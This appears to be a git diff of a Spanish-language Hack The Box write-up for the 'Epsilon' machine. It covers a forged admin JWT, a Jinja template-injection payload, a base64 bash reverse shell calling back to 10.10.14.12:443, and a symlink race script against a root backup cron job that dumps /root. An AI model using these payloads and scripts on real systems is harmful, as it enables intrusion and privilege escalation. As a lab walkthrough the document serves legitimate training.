@@ -1,4 +1,6 @@
 10.10.11.134 - Epsilon
+![Epsilon](https://user-images.githubusercontent.com/96772264/201491387-6a43052d-d7bc-4a94-9162-2860725f11cc.png)
+
 ----------------------
 
 ## Part 1: Enumeración del sistema
@@ -11,7 +13,6 @@ HTTPServer[Werkzeug/2.0.2 Python/3.8.10], PasswordField[password], Python[3.8.10
 └─$ whatweb http://10.10.11.134     
 Apache[2.4.41], HTTPServer[Ubuntu Linux]
 ```
-
 ---------------------------
 ## Part 2: Analizando el repo
 
@@ -56,16 +57,18 @@ Hacemos una prueba con lo de antes
 # Nos lleva a error 403.html 
 ```
 ---------------------------------
-## Parte 3: La web
+## Parte 3: La web y AWS
 
-La web **cloud.epsilon.htb** devuelve un 302 Error. La web del puerto 5000 tiene un panel de registro.
+La web **cloud.epsilon.htb** devuelve un 302 Error. La web del puerto 5000 tiene un panel de registro.  
 
-Ponemos admin:admin y no da resultado. Aun así parece ser la web del repo.
-La ruta **/home** nos devuelve al panel, la **/track** no. 
+![epsilon1](https://user-images.githubusercontent.com/96772264/201491393-79c4cc23-c19b-4e1f-a757-9b51e17cef82.PNG)
 
+Ponemos admin:admin y no da resultado. Aun así parece ser la web del repo. 
+La ruta **/home** nos devuelve al panel, la **/track** no.  
+
+![epsilon2](https://user-images.githubusercontent.com/96772264/201491400-76d03eae-c729-495d-8df1-8ffd30a4aeae.PNG)
 
 Mirando el codigo fuente no hay nada mas interesante:
-
 
 Pero si le metermos un ID como pide nos lleva otra vez al panel del registro.
 Las inyecciones SQL no funcionan ```admin' and 1=1-- -``` o ```admin' and sleep(5)-- -``` 
@@ -115,8 +118,16 @@ Este secreto sirve para el server.py
 >>> jwt.encode({'username':'admin'}, secret, algorithm='HS256')
 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg'
 ```
-Ahora podemos entrar en la ruta /order con POST -> costume=glasses&q=test&addr=test
-Para maniobrar mas cómodamente me hago un script:
+![epsilon3](https://user-images.githubusercontent.com/96772264/201491434-b5cb84a6-b50a-4b3d-aad5-2ceeb7107052.PNG)
+
+Ahora podemos entrar en la ruta /order con POST -> costume=glasses&q=test&addr=test  
+![epsilon4](https://user-images.githubusercontent.com/96772264/201491443-f10663ed-7470-4782-8f8f-889dad5b7f09.PNG)
+![epsilon5](https://user-images.githubusercontent.com/96772264/201491447-1b35ac7e-c60a-4686-98b8-6e770a0dd9f0.PNG)
+
+---------------------------------
+## Parte 4: Accediendo al sistema
+
+Para maniobrar mas cómodamente me hago un script: 
 
 ```python
 import requests
@@ -141,9 +152,9 @@ Enter Address:
 [Order]
 Your order of "glasses" has been placed successfully.
 ```
-Como es python y refleja el resultado, podriamos probar un STTI: ```data = {'costume':'{{7*7}}','q':'1','addr':'{{7*7}}'}```
 
-Si pongo ```{{url_for.__globals__.os.popen('whoami').read()}}``` el resultado es: ```Your order of "tom " has been placed successfully.```
+Como es python y refleja el resultado, podriamos probar un STTI: ```data = {'costume':'{{7*7}}','q':'1','addr':'{{7*7}}'}```  
+Si pongo ```{{url_for.__globals__.os.popen('whoami').read()}}``` el resultado es: ```Your order of "tom " has been placed successfully.```  
 
 ```console
 └─$ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'" | base64 -w0
@@ -155,27 +166,28 @@ stti = "{{url_for.__globals__.os.popen('" + comando + "').read()}}"
 data = {'costume': stti,'q':'1','addr':'{{7*7}}'}
 ```
 
-Y tenemos acceso al sistema, encima scripteado por lo que es muy comodo. Encima subo mi script de enumeración:
-- MI usuario "Tom", el otro root, nadie mas
-- No hay capabilities pero si un sudo SUID (luego vemos si es una versión vulnerable)
-- Este tal Tom es el propietario de todo el codigo fuente de la app. Ruta **/var/www/app/**
-- Hay un backup que parece interesante en -> /var/backups/web_backups
-- Parece que hay un conteneder en la ip 172.19.0.2 conectado por el puerto 4566 (esta máquina es 172.19.0.2)
+Y tenemos acceso al sistema, encima scripteado por lo que es muy comodo. Encima subo mi script de enumeración:  
+- MI usuario "Tom", el otro root, nadie mas  
+- No hay capabilities pero si un sudo SUID (luego vemos si es una versión vulnerable)  
+- Este tal Tom es el propietario de todo el codigo fuente de la app. Ruta **/var/www/app/**  
+- Hay un backup que parece interesante en -> /var/backups/web_backups  
+- Parece que hay un conteneder en la ip 172.19.0.2 conectado por el puerto 4566 (esta máquina es 172.19.0.2)  
 
 ```console
 tom@epsilon:/tmp$ ping -c 1 172.19.0.2
 1 packets transmitted, 1 received, 0% packet loss, time 0ms # En efecto
 ```
-El conteneder es lo que debe correr la app supongo. Subo un detector de [procesos](https://github.com/CUCUxii/Pentesting-tools/blob/main/procmon.sh)
-
+El conteneder es lo que debe correr la app supongo. Subo un detector de [procesos](https://github.com/CUCUxii/Pentesting-tools/blob/main/procmon.sh)  
 
 ```console
 tom@epsilon:/tmp$ ./procmon.sh
 > /bin/sh -c /usr/bin/backup.sh
 > /bin/bash /usr/bin/backup.sh
 ```
+---------------------------------
+## Parte 5: Escalando privilegios gracias a enlaces simbólicos
 
-Este script:
+Encontramos este script:
 ```bash
 #!/bin/bash
 file='date +%N' # Fecha actual en nanosegundos
@@ -185,36 +197,30 @@ sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum # Hace
 
 sleep 5 # Espera cinco segundos
 check_file='date +%N' # Otra vez calcula el tiempo en nanosegundos
-/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
+/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar" 
 # Comprime /opt/backups/checksum y /opt/backups/$file.tar y lo mete en /var/backups/web_backups/${check_file}.tar
 /usr/bin/rm -rf /opt/backups/* # Luego vuelve a vaciar el directorio /opt/backups
 ```
 
-O sea estamos tratando con un script que cada cinco segundos nos vacia el /opt/backups. En cambio los archivos de
-/var/backups/web_backups se mantienen mas tiempo.
+O sea estamos tratando con un script que cada cinco segundos nos vacia el /opt/backups. En cambio los archivos de /var/backups/web_backups se mantienen mas tiempo.   
+Si hacemos ```watch -n 1 ls /opt/backups/``` Encontramos en un breve tiempo **678160166.tar** y **checksum**  
 
-Si hacemos ```watch -n 1 ls /opt/backups/``` Encontramos en un breve tiempo **678160166.tar** y **checksum**
+Las opciones de tar son **-c** y **-f** que son para crear un archivo:  
+ > ```tar tar -cvf etc.tar /etc``` Comprime lo que haya en /etc dentro de etc.tar    
+El probelma es la segunda vez que usa este comando con la opción **-h** que tiene que ver con enlaces duros.    
+En /var/www/app/ hay las rutas /img/ con fotos, /app.py que es el codigo que ya teniamos y los htmls de las otras rutas.  
+Si se sustituye el cheksum por un enlace a /root/ (```ln -s /root checksum```) y luego copiamos el tar que cree a /tmp nos habrá volcado los contenidos de root.  
 
-Las opciones de tar son **-c** y **-f** que son para crear un archivo:
- > ```tar tar -cvf etc.tar /etc``` Comprime lo que haya en /etc dentro de etc.tar  
-El probelma es la segunda vez que usa este comando con la opción **-h** que tiene que ver con enlaces duros.  
-
-En /var/www/app/ hay las rutas /img/ con fotos, /app.py que es el codigo que ya teniamos y los htmls de las otras rutas.
-
-Si se sustituye el cheksum por un enlace a /root/ (```ln -s /root checksum```) y luego copiamos el tar que cree
-a /tmp nos habrá volcado los contenidos de root.
-
-Como hay que ser rapidos con el tiempo mejor que se escriptee esto:
+Como hay que ser rapidos con el tiempo mejor que se escriptee esto:  
 ```bash
 #!/bin/bash
-
 while true; do
         if [ -e /opt/backups/checksum ]; then
-                echo "[*] Existe el archivo"; rm -rf /opt/backups/checksum
-                echo "[*] Creando el enlace a /root"; ln -s /root /opt/backups/checksum; sleep 5
+                echo "[*] Existe el archivo"; rm -rf /opt/backups/checksum   # Elimina el cheksum original
+                echo "[*] Creando el enlace a /root"; ln -s /root /opt/backups/checksum; sleep 5  # Crea uno nuevo que apunte a la carpeta del root
                 break
         fi
-        cp /var/backups/web_backups/*.tar /tmp/tars
+        cp /var/backups/web_backups/*.tar /tmp/tars  # Copia ese nuevo tar (o tars) que se ha creado a /tmp/tars para que no se borren
 done
 ```
 
